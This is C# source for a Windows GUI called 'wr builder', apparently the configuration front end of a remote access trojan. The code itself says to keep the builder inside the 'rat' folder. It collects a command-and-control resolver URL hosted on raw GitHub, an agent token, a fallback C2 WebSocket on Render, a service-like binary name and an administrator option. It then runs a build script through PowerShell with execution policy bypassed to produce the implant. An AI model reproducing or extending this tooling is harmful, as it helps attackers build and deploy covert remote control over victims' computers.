using System.Diagnostics;
using System.Text;

namespace WRBuilder
{
    internal static class Program
    {
        [STAThread]
        private static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }

    internal sealed class MainForm : Form
    {
        private readonly TextBox _resolver = new();
        private readonly TextBox _token = new();
        private readonly TextBox _c2 = new();
        private readonly TextBox _name = new();
        private readonly CheckBox _admin = new();
        private readonly CheckBox _noInstall = new();
        private readonly TextBox _log = new();
        private readonly Button _build = new();
        private readonly Label _status = new();

        private static readonly Color Bg = Color.FromArgb(10, 12, 16);
        private static readonly Color PanelBg = Color.FromArgb(6, 7, 9);
        private static readonly Color Fg = Color.FromArgb(200, 208, 218);
        private static readonly Color Dim = Color.FromArgb(91, 100, 114);
        private static readonly Color Accent = Color.FromArgb(255, 77, 77);

        public MainForm()
        {
            Text = "wr builder";
            ClientSize = new Size(700, 560);
            BackColor = Bg;
            ForeColor = Fg;
            Font = new Font("Consolas", 9.5f);
            FormBorderStyle = FormBorderStyle.FixedSingle;
            MaximizeBox = false;
            StartPosition = FormStartPosition.CenterScreen;

            var root = FindRepoRoot();
            var top = 18;

            top = AddField("resolver url (raw github)", _resolver, top,
                "https://raw.githubusercontent.com/<you>/<repo>/main/resolver/c2.json");
            top = AddField("agent token (render env)", _token, top, "AGENT_TOKEN");
            top = AddField("c2 fallback url", _c2, top, "wss://your-app.onrender.com/ws");
            top = AddField("binary name", _name, top, "wrsvc");
            _name.Text = "wrsvc";

            _admin.Text = "require administrator";
            _admin.ForeColor = Dim;
            _admin.Location = new Point(190, top);
            _admin.AutoSize = true;
            Controls.Add(_admin);

            _noInstall.Text = "run without installing";
            _noInstall.ForeColor = Dim;
            _noInstall.Location = new Point(370, top);
            _noInstall.AutoSize = true;
            Controls.Add(_noInstall);

            top += 34;

            _build.Text = "BUILD";
            _build.Location = new Point(190, top);
            _build.Size = new Size(120, 34);
            _build.FlatStyle = FlatStyle.Flat;
            _build.BackColor = Accent;
            _build.ForeColor = Color.FromArgb(18, 5, 5);
            _build.Font = new Font("Consolas", 10f, FontStyle.Bold);
            _build.FlatAppearance.BorderSize = 0;
            _build.Click += (_, _) => StartBuild();
            Controls.Add(_build);

            var open = new Button
            {
                Text = "open dist",
                Location = new Point(320, top),
                Size = new Size(110, 34),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(18, 22, 28),
                ForeColor = Fg
            };
            open.FlatAppearance.BorderColor = Color.FromArgb(35, 40, 48);
            open.Click += (_, _) => OpenDist();
            Controls.Add(open);

            _status.Text = "idle";
            _status.ForeColor = Dim;
            _status.Location = new Point(445, top + 10);
            _status.AutoSize = true;
            Controls.Add(_status);

            top += 50;
            _log.Multiline = true;
            _log.ReadOnly = true;
            _log.ScrollBars = ScrollBars.Vertical;
            _log.BackColor = PanelBg;
            _log.ForeColor = Fg;
            _log.BorderStyle = BorderStyle.FixedSingle;
            _log.Location = new Point(18, top);
            _log.Size = new Size(664, ClientSize.Height - top - 18);
            _log.Font = new Font("Consolas", 9f);
            Controls.Add(_log);

            if (!string.IsNullOrEmpty(root))
                Append($"repo: {root}");
            else
                Append("build.ps1 not found above the exe — keep the builder inside the rat folder");
        }

        private int AddField(string label, TextBox box, int top, string placeholder)
        {
            var lb = new Label
            {
                Text = label,
                ForeColor = Dim,
                Location = new Point(18, top + 8),
                AutoSize = true
            };
            Controls.Add(lb);

            box.Location = new Point(190, top);
            box.Size = new Size(492, 26);
            box.BackColor = PanelBg;
            box.ForeColor = Fg;
            box.BorderStyle = BorderStyle.FixedSingle;
            box.PlaceholderText = placeholder;
            Controls.Add(box);
            return top + 40;
        }

        private static string FindRepoRoot()
        {
            var dir = new DirectoryInfo(AppContext.BaseDirectory);
            for (var i = 0; i < 8 && dir != null; i++)
            {
                if (File.Exists(Path.Combine(dir.FullName, "build.ps1")))
                    return dir.FullName;
                dir = dir.Parent;
            }
            return null;
        }

        private void Append(string line)
        {
            if (_log.IsDisposed) return;
            _log.AppendText(line + Environment.NewLine);
        }

        private async void StartBuild()
        {
            var root = FindRepoRoot();
            if (root is null) { Append("!! build.ps1 not found"); return; }
            if (string.IsNullOrWhiteSpace(_resolver.Text) || string.IsNullOrWhiteSpace(_token.Text))
            {
                Append("!! resolver url and agent token are required");
                return;
            }

            _build.Enabled = false;
            _status.Text = "building";
            _status.ForeColor = Color.FromArgb(255, 200, 87);
            _log.Clear();

            var script = Path.Combine(root, "build.ps1");
            var ps = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                WorkingDirectory = root
            };
            ps.ArgumentList.Add("-NoProfile");
            ps.ArgumentList.Add("-ExecutionPolicy");
            ps.ArgumentList.Add("Bypass");
            ps.ArgumentList.Add("-File");
            ps.ArgumentList.Add(script);
            ps.ArgumentList.Add("-Resolver");
            ps.ArgumentList.Add(_resolver.Text.Trim());
            ps.ArgumentList.Add("-Token");
            ps.ArgumentList.Add(_token.Text.Trim());
            if (!string.IsNullOrWhiteSpace(_c2.Text))
            {
                ps.ArgumentList.Add("-C2");
                ps.ArgumentList.Add(_c2.Text.Trim());
            }
            if (!string.IsNullOrWhiteSpace(_name.Text))
            {
                ps.ArgumentList.Add("-Name");
                ps.ArgumentList.Add(_name.Text.Trim());
            }
            if (_admin.Checked) ps.ArgumentList.Add("-Admin");

            var sw = Stopwatch.StartNew();
            try
            {
                using var p = new Process { StartInfo = ps, EnableRaisingEvents = true };
                p.OutputDataReceived += (_, e) => { if (e.Data != null) BeginInvoke(() => Append(e.Data)); };
                p.ErrorDataReceived += (_, e) => { if (e.Data != null) BeginInvoke(() => Append(e.Data)); };
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
                await p.WaitForExitAsync();

                sw.Stop();
                if (p.ExitCode == 0)
                {
                    _status.Text = $"ok · {sw.Elapsed.TotalSeconds:0.0}s";
                    _status.ForeColor = Color.FromArgb(107, 255, 135);
                }
                else
                {
                    _status.Text = $"failed ({p.ExitCode})";
                    _status.ForeColor = Accent;
                }
            }
            catch (Exception e)
            {
                Append("!! " + e.Message);
                _status.Text = "failed";
                _status.ForeColor = Accent;
            }
            finally
            {
                _build.Enabled = true;
            }
        }

        private void OpenDist()
        {
            var root = FindRepoRoot();
            var dist = root is null ? null : Path.Combine(root, "dist");
            if (dist != null && Directory.Exists(dist))
                Process.Start(new ProcessStartInfo { FileName = dist, UseShellExecute = true });
            else
                Append("dist/ does not exist yet");
        }
    }
}
